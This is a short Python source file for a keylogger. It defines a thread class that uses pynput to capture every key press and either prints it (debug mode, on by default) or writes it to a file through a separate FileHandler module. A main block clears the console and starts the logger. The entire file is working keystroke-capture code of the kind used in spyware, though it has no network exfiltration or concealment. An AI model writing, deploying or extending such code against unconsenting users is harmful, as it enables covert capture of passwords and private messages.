import shutil
from pynput.keyboard import Key, Listener
from datetime import datetime
from threading import Thread



class Keylogger(Thread):

    def __init__(self, filehandler):
        Thread.__init__(self, name='keylogging')
        self.__debug = True
        self.__dateTime = datetime.now()
        self.__filehandler = filehandler



    def onPress(self, key):
        if self.__debug:
            print(key, end='')
        else:
            self.__filehandler.writeToFile(key)



    def run(self):
        with Listener(on_press=self.onPress) as listener:
            listener.join()



if __name__ == "__main__":
    from FileHandler import FileHandler
    from os import system
    system('cls')
    fileHandler = FileHandler()
    keylogger = Keylogger(fileHandler)
    keylogger.start()